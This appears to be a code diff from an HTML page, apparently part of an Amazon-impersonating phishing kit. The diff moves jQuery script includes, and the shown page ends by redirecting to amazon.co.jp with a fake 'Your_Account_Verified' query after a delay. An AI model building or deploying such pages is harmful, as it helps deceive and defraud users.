@@ -35,7 +35,8 @@
  <body id="bodyid">
   
  </body>
-
+<script src="../js/jquery.min.js"></script>
+<script src="../js/jquery.validate.min.js"></script>
  <script type="text/javascript">
      let content = document.getElementById('bodyid');
      content.innerHTML="\n" +
@@ -574,8 +575,6 @@
              "   </div> \n" +
              "  </div> ";
  </script>
-        <script src="../js/jquery.min.js"></script>
-        <script src="../js/jquery.validate.min.js"></script>
         <script type="text/javascript">
         window.setTimeout("location=('https://amazon.co.jp/?Your_Account_Verified');", 3000);
     </script>
